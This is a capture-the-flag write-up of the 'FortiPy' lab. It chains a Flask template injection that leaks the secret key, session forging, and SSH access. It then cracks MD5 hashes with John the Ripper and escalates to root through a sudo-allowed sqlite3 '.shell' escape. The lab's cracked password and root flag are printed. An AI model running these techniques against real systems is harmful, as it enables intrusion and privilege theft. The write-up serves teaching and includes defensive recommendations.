# FortiPy – Full Exploitation Writeup




{{< admonition tldr "TL;DR" >}}

**FortiPy – Full Exploitation Writeup** is a misc challenge from **HackerDNA**. This challenge demonstrates a realistic multi-stage compromise involving web application exploitation, credential discovery, password cracking, and privilege escalation via a misconfigured `sudo` rule.

{{< /admonition >}}

## Overview

This challenge demonstrates a realistic multi-stage compromise involving web application exploitation, credential discovery, password cracking, and privilege escalation via a misconfigured `sudo` rule.

The attack chain progresses from a web application vulnerability to full system compromise by leveraging exposed configuration data and weak credential management practices.

---

# Target Information

| Item           | Value                      |
| -------------- | -------------------------- |
| Challenge      | FortiPy                    |
| Category       | Web / Privilege Escalation |
| Initial Access | Web Application            |
| Final Goal     | Root Privilege             |

---

# Attack Path Summary

1. Server-Side Template Injection (SSTI)
2. Leak Flask `SECRET_KEY` 3. Forge Admin Session Cookie
4. Access Restricted Admin Endpoint
5. Obtain SSH Credentials
6. SSH Access as `devadmin14` 7. Database Credential Disclosure
8. Extract Historical Credentials
9. Crack Password Hash
10. Lateral Movement to `sqladmin` 11. Abuse Misconfigured `sudo` Rule
12. Root Privilege Escalation
---

# 1. Server-Side Template Injection (SSTI)

The web application contained a Server-Side Template Injection vulnerability that allowed execution of template expressions.

This vulnerability allowed access to internal Flask objects and configuration variables.

Using template introspection, the Flask `SECRET_KEY` was extracted.

Example concept:

```jinja
{{config}}
```

The extracted `SECRET_KEY` allowed forging authenticated session cookies.

---

# 2. Forging an Admin Session

Flask session cookies are signed using the `SECRET_KEY` .

Once the key was obtained, it was possible to generate a valid administrative session cookie.

Using a session forging tool, a new cookie was generated with administrative privileges.

This granted access to restricted functionality within the application.

---

# 3. Access to Hidden Administrative Endpoints

After forging the session cookie, a previously restricted endpoint becomes accessible:

```
/sshadmin
```

This endpoint revealed SSH access credentials for a system user.

Example access method:

```bash
ssh devadmin14@<target-ip>
```

Successful authentication granted shell access.

---

# 4. Local Enumeration

After gaining shell access as `devadmin14` , system enumeration was performed.

Key files discovered:

```
db_config.ini
```

This file contains database credentials:

```
username=sqluser
password=<redacted>
```

---

# 5. Database Access

The database server was not directly available via `mysql` , but further enumeration revealed a SQLite database.

Discovery:

```bash
find / -name "*.db" 2>/dev/null
```

Result:

```
/opt/database/database.db
```

The database was opened using:

```bash
sqlite3 /opt/database/database.db
```

---

# 6. Database Enumeration

Available tables:

```
.tables
```

Output:

```
logs
oldcreds
transactions
users
```

The table `oldcreds` was particularly interesting as it appeared to contain historical credentials.

Query:

```sql
SELECT * FROM oldcreds;
```

Output:

```
testuser | 60849f5dba5a5fa98a180e25a1a9a2f2
dbtester | e704ce44d4b5ce635a7d797195024081
sqladmin | 6e70d06760276024943e0ec1339ef527
old_admin | 34e541102b00fea03c343ddc5872af98
```

These values appear to be **MD5 password hashes**.

---

# 7. Password Cracking

The hash associated with `sqladmin` was extracted:

```
6e70d06760276024943e0ec1339ef527
```

Using **John the Ripper**:

```bash
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked password:

```
sqlvb60foxpro
```

---

# 8. Lateral Movement to sqladmin

The cracked credentials allowed switching to the `sqladmin` account:

```bash
su sqladmin
```

Verification:

```bash
whoami
```

```
sqladmin
```

---

# 9. Privilege Escalation Enumeration

Checking `sudo` permissions:

```bash
sudo -l
```

Output:

```
User sqladmin may run the following commands on this host:

(ALL) NOPASSWD: /usr/bin/sqlite3 /opt/database/database.db
```

This configuration allows `sqladmin` to run `sqlite3` as root without a password.

---

# 10. Exploiting sqlite3 for Root Access

The `sqlite3` binary contains a built-in command that allows execution of system shell commands.

Exploits:

```bash
sudo sqlite3 /opt/database/database.db
```

Inside the SQLite shell:

```sql
.shell /bin/sh
```

Since `sqlite3` was executed with `sudo` , the spawned shell inherits **root privileges**.

Verification:

```bash
whoami
```

Output:

```
root
```

---

# 11. Retrieving the Root Flag

Finally, the root flag was obtained:

```bash
cat /root/flag-root.txt
```

Result:

```
e29dca62-4860-44d5-d96e-47ad62f8ee54
```

---

# Root Cause Analysis

The compromise was possible due to multiple security weaknesses:

1. Server-Side Template Injection vulnerability
2. Exposure of sensitive configuration ( `SECRET_KEY` )
3. Weak credential management
4. Storage of password hashes without proper protection
5. Password reuse across system accounts
6. Insecure `sudo` configuration allowing command execution via `sqlite3` ---

# Security Recommendations

To prevent similar attacks:

### Web Application Security

* Sanitize all user input in templates
* Disable unsafe template rendering
* Store secrets outside application code

### Credential Management

* Avoid storing historical credentials
* Use salted password hashes (bcrypt / Argon2)
* Enforce strong password policies

### System Hardening

* Avoid granting `sudo` privileges to interpreter-like binaries
* Use principle of least privilege
* Restrict access to sensitive configuration files

### Monitoring

* Monitor abnormal privilege escalations
* Log access to administrative endpoints
* Implement intrusion detection mechanisms

---

# Conclusion

This challenge highlights how **multiple small security weaknesses can combine into a complete system compromise**.

Starting from a web application vulnerability, an attacker was able to:

* escalate privileges within the application
* gain shell access
* extract sensitive database information
* crack credentials
* and ultimately obtain full root privileges.

Proper defense-in-depth practices are essential to prevent such chained exploitation scenarios.

---

**Root Flag**

```
e29dca62-4860-44d5-d96e-47ad62f8ee54
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/fortipy/  

